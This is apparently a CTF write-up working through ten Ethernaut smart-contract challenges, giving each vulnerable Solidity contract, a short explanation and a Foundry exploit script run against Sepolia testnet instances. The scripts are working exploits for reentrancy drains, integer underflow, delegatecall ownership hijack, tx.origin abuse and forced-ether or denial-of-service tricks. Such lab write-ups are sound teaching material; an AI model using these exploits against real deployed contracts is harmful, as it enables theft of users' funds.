---
title: 'Ethernaut Challenges'
cover: https://miro.medium.com/1*aduuY7__I7sgHfTaTjzZ2g.png
categories: ["ctf"]
tags: ["blockchain"]
date: 2025-09-11T12:00:00-04:00
lastmod: 2025-09-11T12:00:00-04:00
---

# Solving Ethernaut Challenges!

## Fallback

### Challenge Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

To solve, we contribute a small amount so our contribution is > 0. Then we send ether directly to the contract, triggering `receive()`, which sets us as the new owner. Finally, we call `withdraw()` to drain the contract.

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallback.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(<YOUR_INSTANCE>));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackInstance.contribute{value: 1 wei}();
        (bool success, ) = address(fallbackInstance).call{value: 1 wei}("");
        require(success, "Fallback call failed");
        console.log("New Owner:", fallbackInstance.owner());
        console.log("My Address:", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/FallbackSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

---

## Fallout

### Challenge Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

The constructor was misspelled as `Fal1out()` instead of `constructor`. That means anyone can call it and claim ownership.

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallout.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before attack:", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("Owner after attack:", falloutInstance.owner());
        console.log("My Address:", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/FalloutSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

---

## CoinFlip

### Challenge Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

Because `blockhash(block.number - 1)` is deterministic, we can calculate the same value off-chain or in another contract, guaranteeing correct guesses.

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/CoinFlip.sol";

contract Exploit {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlipInstance;

    constructor(CoinFlip _coinFlipInstance) {
        coinFlipInstance = _coinFlipInstance;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;
        coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinFlipInstance = CoinFlip(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Exploit exploit = new Exploit(coinFlipInstance);
        exploit.attack();
        console.log("Number of wins:", coinFlipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/CoinFlipSolution.s.sol --rpc-url $SEPOLIA_URL --tc CoinFlipSolution --broadcast
```

---

## Telephone

### Challenge Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

Here, `tx.origin` is the original externally owned account that started the transaction, while `msg.sender` is the immediate caller. The contract allows ownership changes only when called through another contract. We can exploit this by writing a wrapper contract that calls `changeOwner()` on our behalf.

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Telephone.sol";

contract Attack {
    Telephone public telephoneInstance;
    address evilOwner;

    constructor(Telephone _telephoneInstance, address _evilOwner) {
        telephoneInstance = _telephoneInstance;
        evilOwner = _evilOwner;
    }

    function exploit() public {
        telephoneInstance.changeOwner(evilOwner);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephoneInstance = Telephone(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attacker = new Attack(
            telephoneInstance,
            vm.envAddress("MY_ADDRESS")
        );
        attacker.exploit();
        console.log("The owner of the contract is:", telephoneInstance.owner());
        console.log("My address is:", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/TelephoneSolution.s.sol --rpc-url $SEPOLIA_URL --tc TelephoneSolution --broadcast
```

---

## Token

### Challenge Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

This contract is vulnerable to arithmetic underflow in Solidity 0.6. If you try to transfer more tokens than you have, the subtraction `balances[msg.sender] - _value` wraps around to a huge number (since it’s a `uint`). That gives you an enormous balance instead of failing.

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Token.sol";

contract TokenSolution is Script {
    Token public tokenInstance = Token(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(address(0), 21);
        uint256 balance = tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("Attacker balance:", balance);
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/TokenSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

---

## Delegation

### Challenge Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

The `fallback()` function uses `delegatecall`, which executes code from `Delegate` in the storage context of `Delegation`. By sending calldata for `pwn()`, we overwrite `Delegation.owner` with our own address.

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Delegation.sol";

contract DelegationSolution is Script {
    Delegation public delegationInstance = Delegation(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(delegationInstance).call(
            abi.encodeWithSignature("pwn()")
        );
        console.log("Owner of the contract is currently:", delegationInstance.owner());
        console.log("My current address:", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/DelegationSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

---

## Force

### Challenge code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

This contract does not provide any payable functions, so you can’t send ether to it in the usual way.

However, it’s still possible to force ether into a contract by creating another contract, sending it ether, and then using `selfdestruct()` to forcefully push ether to the target.

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Force.sol";

contract Evil {
    receive() external payable {}

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}

contract TokenSolution is Script {
    Force public forceInstance = Force(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Evil evil = new Evil();
        (bool worked,) = address(evil).call{value: 0.0001 ether}("");
        require(worked, "Transfer failed");
        evil.attack(payable(address(forceInstance)));
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/ForceSolution.s.sol --rpc-url $SEPOLIA_URL --tc ForceSolution --broadcast
```

---

## Vault

### Challenge Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

Even though the password variable is marked `private`, all contract storage is publicly visible on-chain. We can simply read the password directly from storage using `cast`.

```bash
cast storage <YOUR_INSTANCE> 1 --rpc-url $SEPOLIA_URL
```

That reveals the hex-encoded password:

```
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

We then decode it into a human-readable string:

```bash
cast parse-bytes32-string 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

Which gives us:

```
A very strong secret password :)
```

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";

contract VaultSolution is Script {
    Vault public vault = Vault(0xF8766Fe10F52402589A5B8bf886e8553807462f3);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vault.unlock("A very strong secret password :)");
        console.log("Check if the vault is locked: ", vault.locked());
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/VaultSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

---

## King

### Challenge Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

To claim kingship, you send ether to the contract. It forwards the payment to the previous king and sets you as the new king.

The trick is to deploy a malicious contract (`EvilKing`) that becomes king but **does not implement a payable `receive()` or fallback function**. When the King contract later tries to forward the prize to this malicious contract, the transfer fails and reverts. This blocks anyone else from ever becoming king again, locking the game.

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/King.sol";

contract EvilKing {
    constructor (King _kingInstance) payable {
        address(_kingInstance).call{value: _kingInstance.prize()}("");
    }
}

contract KingSolution is Script {
    King public kingInstance = King(payable(<YOUR_INSTANCE>));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new EvilKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/KingSolution.s.sol --rpc-url $SEPOLIA_URL --tc KingSolution --broadcast
```

---

## Re-entrancy

### Challenge Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

The contract sends ether to `msg.sender` **before** updating their balance. This ordering allows a **reentrancy attack**: a malicious contract can re-enter `withdraw()` in its fallback or receive function, draining funds repeatedly before the balance is reduced.

We first check the balance of the contract:

```bash
cast balance 0x6d279A9d789bA35A68a2fC5e9FC279a1736470BB --rpc-url $SEPOLIA_URL
```

```
1000000000000000 wei
```

Which equals `0.001 ether`. This is what we can steal.

### Script

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Reentrance.sol";

contract Evil {
    Reentrance public reentranceInstance = Reentrance(payable(0x6d279A9d789bA35A68a2fC5e9FC279a1736470BB));

    constructor() public payable {
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function attack() public payable {
        reentranceInstance.withdraw(0.001 ether);
        address(msg.sender).call{value: 0.002 ether}("");
    }

    receive() external payable {
        reentranceInstance.withdraw(0.001 ether);
    }
}

contract ReentranceSolution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Evil evil = new Evil{value: 0.001 ether}();
        evil.attack{value: 0.001 ether}();
        vm.stopBroadcast();
    }
}
```

### POC

```bash
forge script script/ReentranceSolution.s.sol --rpc-url $SEPOLIA_URL --tc ReentranceSolution --broadcast
```